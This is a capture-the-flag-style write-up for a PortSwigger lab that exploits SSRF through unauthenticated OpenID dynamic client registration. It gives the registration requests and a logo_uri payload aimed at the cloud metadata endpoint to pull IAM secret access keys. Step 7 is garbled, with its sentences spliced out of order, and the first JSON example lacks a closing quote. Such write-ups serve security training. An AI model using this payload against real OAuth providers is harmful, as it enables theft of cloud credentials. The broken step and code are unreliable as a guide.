# SSRF via OpenID Dynamic Client Registration

## 📌 Lab Details
- **Title**: SSRF via OpenID Dynamic Client Registration
- **Difficulty**: Practitioner
- **Category**: OAuth Authentication
- **Lab URL**: https://portswigger.net/academy/labs/launch/832aba2ee324f0e0d7fd3881acff87490bf540d183ebbeccffffd71f5310a150?referrer=%2fweb-security%2foauth%2fopenid%2flab-oauth-ssrf-via-openid-dynamic-client-registration

## 🔍 Summary
This lab demonstrates how an OAuth provider that supports **OpenID Dynamic Client Registration** can introduce a **Server-Side Request Forgery (SSRF)** vulnerability.<br>
The OAuth server allows anyone to register a client application using the `/reg` endpoint. During registration, client metadata such as `logo_uri` can be supplied. The OAuth provider later retrieves this URL server-side when displaying the application's logo. <br>
By controlling the `logo_uri` parameter, an attacker can force the OAuth server to make arbitrary HTTP requests, enabling SSRF against internal services. <br>

## 🛠 Steps to Solve
1. While proxying traffic through Burp, log in to your own account. Browse to `https://oauth-YOUR-OAUTH-SERVER.oauth-server.net/.well-known/openid-configuration` to access the configuration file. Notice that the client registration endpoint is located at `/reg`.
2. In Burp Repeater, create a suitable `POST` request to register your own client application with the OAuth service. You must at least provide a `redirect_uris` array containing an arbitrary whitelist of callback URIs for your fake application. For example:
   ```sh
   POST /reg HTTP/1.1
   Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
   Content-Type: application/json

   {
     "redirect_uris" : [
       "https://example.com
       ]
   }
   ```
3. Send the request. Observe that you have now successfully registered your own client application without requiring any authentication. The response contains various metadata associated with your new client application, including a new `client_id`.
4. Using Burp, audit the OAuth flow and notice that the "Authorize" page, where the user consents to the requested permissions, displays the client application's logo. This is fetched from `/client/CLIENT-ID/logo`. We know from the OpenID specification that client applications can provide the URL for their logo using the `logo_uri` property during dynamic registration. Send the `GET /client/CLIENT-ID/logo` request to Burp Repeater.
5. In Repeater, go back to the POST /reg request that you created earlier. Add the logo_uri property. Paste a Collaborator URL as its value.
   ```sh
   POST /reg HTTP/1.1
   Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
   Content-Type: application/json

   {
     "redirect_uris" : [
       "https://example.com"
       ],
       "logo_uri" : "https://BURP-COLLABORATOR-SUBDOMAIN"
   }
   ```
6. Send the request to register a new client application and copy the `client_id` from the response.
7. In Repeater, go to the `GET /client/CLIENT-ID/logo` request. Replace the `CLIENT-ID`Go to the Collaborator tab dialog and check for any new interactions. Notice that there is an HTTP interaction attempting to fetch your non-existent logo. This confirms that you can successfully use the `logo_uri` property to elicit requests from the OAuth server. in the path with the new one you just copied and send the request.
8. Go back to the `POST /reg` request in Repeater and replace the current `logo_uri` value with the target URL:
   ```sh
   "logo_uri" : "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
   ```
9. Send this request and copy the new `client_id` from the response.
10. Go back to the `GET /client/CLIENT-ID/logo` request and replace the client_id with the new one you just copied. Send this request. Observe that the response contains the sensitive metadata for the OAuth provider's cloud environment, including the secret access key.
11. Submit the solution to solve the lab.

## 📖 Key Takeaways
- OpenID Dynamic Client Registration can introduce security risks when client metadata is not validated.
- OAuth implementations should strictly validate external URLs and restrict outbound requests.
- Cloud metadata endpoints are common SSRF targets.

## 🖼️ Screenshot 
<img width="960" height="540" alt="image" src="https://github.com/user-attachments/assets/7890650c-40ac-4011-abbd-e0fca69b6fb4" />
<img width="960" height="540" alt="image" src="https://github.com/user-attachments/assets/8d95ad8a-036d-4dd3-9f8f-fca8828c1658" />
<img width="960" height="540" alt="image" src="https://github.com/user-attachments/assets/29db4ef3-28ec-4d43-b72a-603114702f7f" />
<img width="960" height="540" alt="image" src="https://github.com/user-attachments/assets/046aa7eb-48e0-47ac-9f1e-69a34835b634" />
<img width="960" height="540" alt="image" src="https://github.com/user-attachments/assets/f9d5917e-7161-4fa6-846f-b8125e3d66ca" />
<img width="960" height="540" alt="image" src="https://github.com/user-attachments/assets/dabe4221-a2ec-4ff7-baf1-99c116819ef4" />
<img width="960" height="540" alt="image" src="https://github.com/user-attachments/assets/91fe6e7d-3daa-4eed-bcf9-c98ad1de4ac5" />
